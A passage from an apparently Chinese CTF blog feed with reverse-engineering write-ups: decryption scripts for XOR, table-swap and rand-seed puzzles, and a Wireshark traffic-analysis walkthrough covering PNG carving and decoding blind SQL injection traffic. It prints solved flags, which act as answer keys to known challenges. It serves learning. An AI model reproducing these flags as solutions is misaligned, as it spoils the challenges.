class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Final Flag: <span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">except</span> UnicodeDecodeError:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Failed to decode as UTF-8. Try other XOR keys or check steps.&quot;</span>)</span><br></pre></td></tr></table></figure><p><img src="/../images/week7-re-ISCC.assets/image-20250521211935934.png" alt="image-20250521211935934"></p><p><code>ISCC&#123;zp#6iNju&#125;US^kTB&#125;</code></p><h2 id="方法二：-1"><a href="#方法二：-1" class="headerlink" title="方法二："></a>方法二：</h2><p>idapython脚本一把梭</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> ida_bytes <span class="keyword">import</span> *</span><br><span class="line">printable=<span class="string">&quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#$%&amp;&#x27;()*+,-./:;&lt;=&gt;?@[\]^_`&#123;|&#125;~&quot;</span></span><br><span class="line">table=[<span class="number">0x0074</span>, <span class="number">0x0073</span>, <span class="number">0x0076</span>, <span class="number">0x0075</span>, <span class="number">0x0078</span>, <span class="number">0x0077</span>, <span class="number">0x007A</span>, <span class="number">0x0079</span>, <span class="number">0x0062</span>, <span class="number">0x0061</span>, <span class="number">0x0020</span>, <span class="number">0x0023</span>, <span class="number">0x0022</span>, <span class="number">0x0025</span>, <span class="number">0x0024</span>, <span class="number">0x0027</span>, <span class="number">0x0026</span>, <span class="number">0x0029</span>, <span class="number">0x0028</span>, <span class="number">0x002B</span>,</span><br><span class="line">       <span class="number">0x002A</span>, <span class="number">0x002D</span>, <span class="number">0x002C</span>, <span class="number">0x002F</span>, <span class="number">0x002E</span>, <span class="number">0x0031</span>, <span class="number">0x0030</span>, <span class="number">0x0033</span>, <span class="number">0x0032</span>, <span class="number">0x0035</span>, <span class="number">0x0034</span>, <span class="number">0x0037</span>, <span class="number">0x0036</span>, <span class="number">0x0039</span>, <span class="number">0x0038</span>, <span class="number">0x003B</span>, <span class="number">0x0000</span>, <span class="number">0x0003</span>, <span class="number">0x0002</span>, <span class="number">0x0005</span>,</span><br><span class="line">       <span class="number">0x0004</span>, <span class="number">0x0007</span>, <span class="number">0x0006</span>, <span class="number">0x0009</span>, <span class="number">0x0008</span>, <span class="number">0x000B</span>, <span class="number">0x000A</span>, <span class="number">0x000D</span>, <span class="number">0x000C</span>, <span class="number">0x000F</span>, <span class="number">0x000E</span>, <span class="number">0x0011</span>, <span class="number">0x0010</span>, <span class="number">0x0013</span>, <span class="number">0x0012</span>, <span class="number">0x0015</span>, <span class="number">0x0014</span>, <span class="number">0x0017</span>, <span class="number">0x0016</span>, <span class="number">0x0019</span>,</span><br><span class="line">       <span class="number">0x0018</span>, <span class="number">0x001B</span>, <span class="number">0x0060</span>, <span class="number">0x0065</span>, <span class="number">0x0068</span>, <span class="number">0x0067</span>, <span class="number">0x006A</span>, <span class="number">0x0069</span>, <span class="number">0x006C</span>, <span class="number">0x006B</span>, <span class="number">0x006E</span>, <span class="number">0x006D</span>, <span class="number">0x0070</span>, <span class="number">0x006F</span>, <span class="number">0x0072</span>, <span class="number">0x0071</span>, <span class="number">0x007B</span>, <span class="number">0x0063</span>, <span class="number">0x007D</span>, <span class="number">0x007C</span>,</span><br><span class="line">       <span class="number">0x007F</span>,<span class="number">0x007E</span>, <span class="number">0x0001</span>, <span class="number">0x001A</span>, <span class="number">0x001D</span>, <span class="number">0x001C</span>, <span class="number">0x001F</span>, <span class="number">0x001E</span>, <span class="number">0x0021</span>, <span class="number">0x003A</span>, <span class="number">0x003D</span>, <span class="number">0x003C</span>, <span class="number">0x003F</span>]</span><br><span class="line"></span><br><span class="line">enc=<span class="built_in">list</span>(get_bytes(<span class="number">0x0140010010</span>,<span class="number">42</span>))</span><br><span class="line">get=[<span class="number">0x67</span>, <span class="number">0xB8</span>, <span class="number">0x4F</span>, <span class="number">0x47</span>, <span class="number">0xAC</span>, <span class="number">0x72</span>, <span class="number">0x6D</span>, <span class="number">0xA2</span>, <span class="number">0x97</span>, <span class="number">0x13</span>,</span><br><span class="line">  <span class="number">0x4E</span>, <span class="number">0x46</span>, <span class="number">0xDE</span>, <span class="number">0xF0</span>, <span class="number">0x31</span>, <span class="number">0x81</span>, <span class="number">0xC5</span>, <span class="number">0xE6</span>, <span class="number">0x92</span>, <span class="number">0xEE</span>,</span><br><span class="line">  <span class="number">0x56</span>, <span class="number">0x9A</span>, <span class="number">0x52</span>, <span class="number">0x28</span>, <span class="number">0x0D</span>, <span class="number">0x6B</span>, <span class="number">0xF6</span>, <span class="number">0xE8</span>, <span class="number">0xD8</span>, <span class="number">0x24</span>,</span><br><span class="line">  <span class="number">0x82</span>, <span class="number">0x3F</span>, <span class="number">0xAB</span>, <span class="number">0x15</span>, <span class="number">0x3E</span>, <span class="number">0x17</span>, <span class="number">0xBD</span>, <span class="number">0x91</span>, <span class="number">0x83</span>, <span class="number">0xFE</span>,</span><br><span class="line">  <span class="number">0x7A</span>, <span class="number">0x74</span>, <span class="number">0x64</span>, <span class="number">0x4B</span>, <span class="number">0x1B</span>, <span class="number">0xAB</span>, <span class="number">0xE0</span>, <span class="number">0xB6</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(enc)):</span><br><span class="line">    enc[i]^=get[i]^<span class="number">0x73</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(enc),<span class="number">2</span>):</span><br><span class="line">    <span class="built_in">print</span>(printable[table.index(enc[i])],end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure><p><img src="/../images/week7-re-ISCC.assets/image-20250523173739479.png" alt="image-20250523173739479"></p><p>运行得到flag</p><p>我们看一下逻辑</p><p>解密混淆数据，使用xor异或和查表替换还原原始数据</p><ol><li>读取加密数据</li><li>用<code>get</code>数组和<code>0x73</code>进行xor解密</li><li>每两个字节取第1字节</li><li>用<code>printable</code>映射到最终字符，输出结果</li></ol><h1 id="uglyCpp"><a href="#uglyCpp" class="headerlink" title="uglyCpp"></a>uglyCpp</h1><p>先查壳</p><p><img src="/../images/week7-re-ISCC.assets/image-20250523190907338.png" alt="image-20250523190907338"></p><p>直接看一下main函数，看一下</p><p>看到有一段奇怪的字符，可能是密文，也就是黄色部分，跟进看一下</p><p><img src="/../images/week7-re-ISCC.assets/image-20250523191338853.png" alt="image-20250523191338853"></p><p>看到密文</p><p><img src="/../images/week7-re-ISCC.assets/image-20250523191559971.png" alt="image-20250523191559971"></p><p>提取一下其中的数据</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">v12[<span class="number">0</span>] = <span class="number">1203532546</span>;     <span class="comment">// 0x47C2B102</span></span><br><span class="line">v12[<span class="number">1</span>] = <span class="number">-1807746716</span>;    <span class="comment">// 0x93E3B964</span></span><br><span class="line">v12[<span class="number">2</span>] = <span class="number">-2001187227</span>;    <span class="comment">//x88A0B565  </span></span><br><span class="line">v12[<span class="number">3</span>] = <span class="number">-339581758</span>;     <span class="comment">// 0xECB9E4C2</span></span><br><span class="line">v12[<span class="number">4</span>] = <span class="number">1226083970</span>;     <span class="comment">// 0x4913C282</span></span><br><span class="line">v12[<span class="number">5</span>] = <span class="number">856099254</span>;      <span class="comment">// 0x3307F0B6</span></span><br><span class="line">v12[<span class="number">6</span>] = <span class="number">1418123825</span>;     <span class="comment">// 0x547F3031</span></span><br><span class="line">v12[<span class="number">7</span>] = <span class="number">-441936971</span>;     <span class="comment">// 0xE5C3B4B5</span></span><br><span class="line">v12[<span class="number">8</span>] = <span class="number">662953528</span>;      <span class="comment">// 0x2784B338</span></span><br></pre></td></tr></table></figure><p>写解密脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">v = [<span class="number">1203532546</span>,-<span class="number">1807746716</span>,-<span class="number">2001187227</span>,-<span class="number">339581758</span>,<span class="number">1226083970</span>,<span class="number">856099254</span>,<span class="number">1418123825</span>,-<span class="number">441936971</span>,<span class="number">662953528</span>]<span class="comment">#密文</span></span><br><span class="line">v = [i&amp;<span class="number">0xffffffff</span> <span class="keyword">for</span> i <span class="keyword">in</span> v]  //转换为无符号数</span><br><span class="line">xor = [<span class="number">0x3ED6325B</span>, <span class="number">0xD709BF17</span>, <span class="number">0xE3F27E18</span>, <span class="number">0xA0870791</span>, <span class="number">0x0146D6F9</span>, <span class="number">0x7C6140FF</span>, <span class="number">0x10B69406</span>, <span class="number">0x94DDE0F6</span>, <span class="number">0x40B2BB6C</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(v)):</span><br><span class="line">    v[i] ^= xor[i]</span><br><span class="line">flag = <span class="string">&quot;&quot;</span>.join([i.to_bytes(length=<span class="number">4</span>, byteorder=<span class="string">&quot;little&quot;</span>).decode() <span class="keyword">for</span> i <span class="keyword">in</span> v])</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line">c_table = <span class="string">&quot;5p6h7q8d9risbtjuevkwaxlyfzm0c1n2g3o4&quot;</span></span><br><span class="line">table = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz0123456789&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> table:</span><br><span class="line">    <span class="built_in">print</span>(flag[c_table.index(i)], end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure><p>看一下脚本的逻辑</p><p><img src="/../images/week7-re-ISCC.assets/image-20250523193301884.png" alt="image-20250523193301884"></p><p><code>ISCC&#123;7TyJERf0u1AF0kcKXHIONDsqegYjs6&#125;</code></p><p>xor运算和查表替换，还原出最终的flag字符串</p>]]></content>
      
      
      
        <tags>
            
            <tag> re </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>week5-web-流量分析</title>
      <link href="/2025/05/10/week5-web-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"/>
      <url>/2025/05/10/week5-web-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<p><a href="https://www.wireshark.org/download.html">https://www.wireshark.org/download.html</a> 上面的是安装网址，直接安装就好</p><p>我们通常使用wireshark来分析，捕获，可视化网络流量</p><p>flag等信息直接隐藏在流量包中，或者通过分析流量包看流量包中是否有其他文件（jpg,zip,png等类型），通过提取解决，进行下一步分析</p><h1 id="类型："><a href="#类型：" class="headerlink" title="类型："></a>类型：</h1><h2 id="1-流汇聚（直接流汇聚得到flag）"><a href="#1-流汇聚（直接流汇聚得到flag）" class="headerlink" title="1.流汇聚（直接流汇聚得到flag）"></a>1.流汇聚（直接流汇聚得到flag）</h2><p>明文的就不说了，很简单</p><h2 id="2-提取数据的"><a href="#2-提取数据的" class="headerlink" title="2.提取数据的"></a>2.提取数据的</h2><h3 id="1-藏在压缩包中"><a href="#1-藏在压缩包中" class="headerlink" title="(1)藏在压缩包中"></a>(1)藏在压缩包中</h3><p>没找到例题</p><h3 id="2-藏在图片中"><a href="#2-藏在图片中" class="headerlink" title="(2)藏在图片中"></a>(2)藏在图片中</h3><h3 id="Cephalopod"><a href="#Cephalopod" class="headerlink" title="Cephalopod"></a>Cephalopod</h3><p>我们先查找一下，在列表，详情，字节流中都找一下flag这个关键字</p><p><img src="/../images/week5-web-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90.assets/1746891783824-14.png" alt="img"></p><p>我们看到了flag.png这个字符串</p><p>重新搜索一下png文件头（89 50 4E 47)</p><p><img src="/../images/week5-web-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90.assets/1746891783823-1.png" alt="img"></p><p>看到发灰那一行有TCP包，右键追踪一下</p><p><img src="/../images/week5-web-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90.assets/1746891783823-2.png" alt="img"></p><p>我们看到了关键字，我们以原始数据保存一下</p><p>用010打开这个原始文件</p><p>我们已知flag是在一个png中，，已知png的文件头，我们搜索一下</p><p><img src="/../images/week5-web-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90.assets/1746891783823-3.png" alt="img"></p><p>删除前面</p><p>保存为.png,重新打开</p><p><img src="/../images/week5-web-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90.assets/1746891783823-4.png" alt="img"></p><p>这样我们就得到了flag</p><p><a href="https://blog.csdn.net/weixin_42575797/article/details/128471451">https://blog.csdn.net/weixin_42575797/article/details/128471451</a></p><p><a href="https://blog.csdn.net/m0_71274136/article/details/135032787">https://blog.csdn.net/m0_71274136/article/details/135032787</a></p><h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><h3 id="鹤城杯-2021-流量分析"><a href="#鹤城杯-2021-流量分析" class="headerlink" title="[鹤城杯 2021]流量分析"></a>[鹤城杯 2021]流量分析</h3><p>这道题是有关布尔盲注的流量包分析</p><ul><li>布尔盲注爆出数据的原理其实是通过截取单个字符利用Ascii码来爆破字符，最后出现的Ascii码则是对应字符的Ascii码。</li></ul><p>直接利用脚本进行转换</p><p>暂时无法在飞书文档外展示此内容</p><p><img src="/../images/week5-web-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90.assets/1746891783823-5.png" alt="img"></p><h2 id="Misc流量分析"><a href="#Misc流量分析" class="headerlink" title="Misc流量分析"></a>Misc流量分析</h2><p>题目描述:</p><p>小明爱慕小红已久，但是他又不好意思直接给小红表白，就悄悄给小红发了一个flag，你能找到小明发送flag吗？ 注意：flag格式如下： flag{****************<em><strong><strong><strong>7</strong></strong></strong></em>3}</p><h2 id="流量分析1"><a href="#流量分析1" class="headerlink" title="流量分析1"></a>流量分析1</h2><p>题目描述:</p><p>流量分析，你知道这堆流量做了什么事情吗，你能恢复出来flag吗？</p><p><img src="/../images/week5-web-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90.assets/1746891783823-6.png" alt="img"></p><p>我们先追踪tcp流一下试试看</p><p><img src="/../images/week5-web-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90.assets/1746891783823-7.png" alt="img"></p><p>我们将请求包中的url解码试试</p><p>暂时无法在飞书文档外展示此内容</p><p>我们给他url解码</p><p><img src="/../images/week5-web-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90.assets/1746891783823-8.png" alt="img"></p><p>一直进行</p><p><img src="/../images/week5-web-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90.assets/1746891783823-9.png" alt="img"></p><p>解了两次，得到</p><p>暂时无法在飞书文档外展示此内容</p><p>发现ssrf和sql注入</p><p>在上面清楚地看到，41延时3秒</p><p><img src="/../images/week5-web-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90.assets/1746891783823-10.png" alt="img"></p><p>看到</p><p><img src="/../images/week5-web-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90.assets/1746891783823-11.png" alt="img"></p><p>暂时无法在飞书文档外展示此内容</p><p>再进行解码</p><p><img src="/../images/week5-web-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90.assets/1746891783823-12.png" alt="img"></p><p><img src="/../images/week5-web-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90.assets/1746891783823-13.png" alt="img"></p><p>依旧是两次</p><p>暂时无法在飞书文档外展示此内容</p><p>这样我们就获得每一个字符的ascill码值，分别推导：例如第一个是102，那么对应f</p><p>102，108，97，103，123，49，113，119，121，50，55，56，49，125</p><p>f，l，a，g ，{，1，q，w，y，2，7，8，1，}</p><p>flag{1qwy2781}</p>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>week5-re-例题</title>
      <link href="/2025/05/10/week5-re-%E4%BE%8B%E9%A2%98/"/>
      <url>/2025/05/10/week5-re-%E4%BE%8B%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<h1 id="HNCTF-2022-WEEK2-e-sy-flower"><a href="#HNCTF-2022-WEEK2-e-sy-flower" class="headerlink" title="[HNCTF 2022 WEEK2]e@sy_flower"></a>[HNCTF 2022 WEEK2]e@sy_flower</h1><p><img src="/../images/week5-re-%E4%BE%8B%E9%A2%98.assets/1746891657818-28.png" alt="img"></p><p>先查壳，32位，并且没有加壳</p><p>直接拖进ida</p><p><img src="/../images/week5-re-%E4%BE%8B%E9%A2%98.assets/1746891657811-1.png" alt="img"></p><p>看到这一部分，可能是花指令</p><p>我们把前面的E9改为90</p><p><img src="/../images/week5-re-%E4%BE%8B%E9%A2%98.assets/1746891657812-2.png" alt="img"></p><p><img src="/../images/week5-re-%E4%BE%8B%E9%A2%98.assets/1746891657812-3.png" alt="img"></p><p>在main函数按P生成一下，再f5转换</p><p><img src="/../images/week5-re-%E4%BE%8B%E9%A2%98.assets/1746891657812-4.png" alt="img"></p><p><img src="/../images/week5-re-%E4%BE%8B%E9%A2%98.assets/1746891657812-5.png" alt="img"></p><p>发现有两段加密代码</p><p>第一段</p><p><img src="/../images/week5-re-%E4%BE%8B%E9%A2%98.assets/1746891657812-6.png" alt="img"></p><p>这个的作用是将原本的字符串重排，循环的次数&#x3D;字符串长度&#x2F;2</p><p>第二段主要就是一个异或</p><p><img src="/../images/week5-re-%E4%BE%8B%E9%A2%98.assets/1746891657812-7.png" alt="img"></p><p>我们可以利用脚本来解决这个问题</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> <span class="type">const</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">char</span> flag[] = <span class="string">&quot;c~scvdzKCEoDEZ[^roDICUMC&quot;</span>;</span><br><span class="line">    <span class="type">char</span> v5;</span><br><span class="line">    <span class="type">int</span> len = <span class="built_in">strlen</span>(flag);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len / <span class="number">2</span>; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        v5 = flag[<span class="number">2</span> * i];</span><br><span class="line">        flag[<span class="number">2</span> * i] = flag[<span class="number">2</span> * i + <span class="number">1</span>];</span><br><span class="line">        flag[<span class="number">2</span> * i + <span class="number">1</span>] = v5;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; len; j++)</span><br><span class="line">    &#123;</span><br><span class="line">        flag[j] ^= <span class="number">0x30</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, flag);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/../images/week5-re-%E4%BE%8B%E9%A2%98.assets/1746891657812-8.png" alt="img"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NSSCTF&#123;Just_junk_Bytess&#125;</span><br></pre></td></tr></table></figure><h1 id="NISACTF-2022-string"><a href="#NISACTF-2022-string" class="headerlink" title="[NISACTF 2022]string"></a>[NISACTF 2022]string</h1><p>先查壳</p><p><img src="/../images/week5-re-%E4%BE%8B%E9%A2%98.assets/1746891657812-9.png" alt="img"></p><p>我是直接进入main函数，直接就看到了关键部分</p><p><img src="/../images/week5-re-%E4%BE%8B%E9%A2%98.assets/1746891657812-10.png" alt="img"></p><p>我们看到flag(v4),你点开后，能看到</p><p><img src="/../images/week5-re-%E4%BE%8B%E9%A2%98.assets/1746891657812-11.png" alt="img"></p><p>看到了flag的长度为13</p><p><img src="/../images/week5-re-%E4%BE%8B%E9%A2%98.assets/1746891657812-12.png" alt="img"></p><p>我们转换一下进制</p><p><img src="/../images/week5-re-%E4%BE%8B%E9%A2%98.assets/1746891657812-13.png" alt="img"></p><p>编写脚本，</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> seed = <span class="number">0x2766</span>;</span><br><span class="line">    <span class="type">int</span> m;</span><br><span class="line">    <span class="type">int</span> v4;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">srand</span>(seed);</span><br><span class="line">    <span class="keyword">for</span> ( m = <span class="number">0</span>; m &lt; <span class="number">13</span>; ++m ) &#123;</span><br><span class="line">        v4 = <span class="built_in">rand</span>();</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, (<span class="type">unsigned</span> <span class="type">int</span>)(v4 % <span class="number">8</span> + <span class="number">1</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行出结果</p><p><img src="/../images/week5-re-%E4%BE%8B%E9%A2%98.assets/1746891657812-14.png" alt="img"></p><p>但是不知道为啥不对，看网上别人的wp中说的是要在linux下运行正确</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NSSCTF&#123;5353316611126&#125;</span><br></pre></td></tr></table></figure><h1 id="LitCTF-2023-enbase64"><a href="#LitCTF-2023-enbase64" class="headerlink" title="[LitCTF 2023]enbase64"></a>[LitCTF 2023]enbase64</h1><p><img src="/../images/week5-re-%E4%BE%8B%E9%A2%98.assets/1746891657812-15.png" alt="img"></p><p>看到我们的主函数</p><p><img src="/../images/week5-re-%E4%BE%8B%E9%A2%98.assets/1746891657812-16.png" alt="img"></p><p><img src="/../images/week5-re-%E4%BE%8B%E9%A2%98.assets/1746891657812-17.png" alt="img"></p><p>跟进base64</p><p><img src="/../images/week5-re-%E4%BE%8B%E9%A2%98.assets/1746891657812-18.png" alt="img"></p><p>看到有一个换表操作</p><p>跟进一下</p><p><img src="/../images/week5-re-%E4%BE%8B%E9%A2%98.assets/1746891657812-19.png" alt="img"></p><p>发现换了48次，并且有数值</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">v3[<span class="number">0</span>] = <span class="number">16</span>;</span><br><span class="line"> v3[<span class="number">1</span>] = <span class="number">34</span>;</span><br><span class="line"> v3[<span class="number">2</span>] = <span class="number">56</span>;</span><br><span class="line"> v3[<span class="number">3</span>] = <span class="number">7</span>;</span><br><span class="line"> v3[<span class="number">4</span>] = <span class="number">46</span>;</span><br><span class="line"> v3[<span class="number">5</span>] = <span class="number">2</span>;</span><br><span class="line"> v3[<span class="number">6</span>] = <span class="number">10</span>;</span><br><span class="line"> v3[<span class="number">7</span>] = <span class="number">44</span>;</span><br><span class="line"> v3[<span class="number">8</span>] = <span class="number">20</span>;</span><br><span class="line"> v3[<span class="number">9</span>] = <span class="number">41</span>;</span><br><span class="line"> v3[<span class="number">10</span>] = <span class="number">59</span>;</span><br><span class="line"> v3[<span class="number">11</span>] = <span class="number">31</span>;</span><br><span class="line"> v3[<span class="number">12</span>] = <span class="number">51</span>;</span><br><span class="line"> v3[<span class="number">13</span>] = <span class="number">60</span>;</span><br><span class="line"> v3[<span class="number">14</span>] = <span class="number">61</span>;</span><br><span class="line"> v3[<span class="number">15</span>] = <span class="number">26</span>;</span><br><span class="line"> v3[<span class="number">16</span>] = <span class="number">5</span>;</span><br><span class="line"> v3[<span class="number">17</span>] = <span class="number">40</span>;</span><br><span class="line"> v3[<span class="number">18</span>] = <span class="number">21</span>;</span><br><span class="line"> v3[<span class="number">19</span>] = <span class="number">38</span>;</span><br><span class="line"> v3[<span class="number">20</span>] = <span class="number">4</span>;</span><br><span class="line"> v3[<span class="number">21</span>] = <span class="number">54</span>;</span><br><span class="line"> v3[<span class="number">22</span>] = <span class="number">52</span>;</span><br><span class="line"> v3[<span class="number">23</span>] = <span class="number">47</span>;</span><br><span class="line"> v3[<span class="number">24</span>] = <span class="number">3</span>;</span><br><span class="line"> v3[<span class="number">25</span>] = <span class="number">11</span>;</span><br><span class="line"> v3[<span class="number">26</span>] = <span class="number">58</span>;</span><br><span class="line"> v3[<span class="number">27</span>] = <span class="number">48</span>;</span><br><span class="line"> v3[<span class="number">28</span>] = <span class="number">32</span>;</span><br><span class="line"> v3[<span class="number">29</span>] = <span class="number">15</span>;</span><br><span class="line"> v3[<span class="number">30</span>] = <span class="number">49</span>;</span><br><span class="line"> v3[<span class="number">31</span>] = <span class="number">14</span>;</span><br><span class="line"> v3[<span class="number">32</span>] = <span class="number">37</span>;</span><br><span class="line"> v3[<span class="number">34</span>] = <span class="number">55</span>;</span><br><span class="line"> v3[<span class="number">35</span>] = <span class="number">53</span>;</span><br><span class="line"> v3[<span class="number">36</span>] = <span class="number">24</span>;</span><br><span class="line"> v3[<span class="number">37</span>] = <span class="number">35</span>;</span><br><span class="line"> v3[<span class="number">38</span>] = <span class="number">18</span>;</span><br><span class="line"> v3[<span class="number">39</span>] = <span class="number">25</span>;</span><br><span class="line"> v3[<span class="number">40</span>] = <span class="number">33</span>;</span><br><span class="line"> v3[<span class="number">41</span>] = <span class="number">43</span>;</span><br><span class="line"> v3[<span class="number">42</span>] = <span class="number">50</span>;</span><br><span class="line"> v3[<span class="number">43</span>] = <span class="number">39</span>;</span><br><span class="line"> v3[<span class="number">44</span>] = <span class="number">12</span>;</span><br><span class="line"> v3[<span class="number">45</span>] = <span class="number">19</span>;</span><br><span class="line"> v3[<span class="number">46</span>] = <span class="number">13</span>;</span><br><span class="line"> v3[<span class="number">47</span>] = <span class="number">42</span>;</span><br><span class="line"> v3[<span class="number">48</span>] = <span class="number">9</span>;</span><br><span class="line"> v3[<span class="number">49</span>] = <span class="number">17</span>;</span><br><span class="line"> v3[<span class="number">50</span>] = <span class="number">28</span>;</span><br><span class="line"> v3[<span class="number">51</span>] = <span class="number">30</span>;</span><br><span class="line"> v3[<span class="number">52</span>] = <span 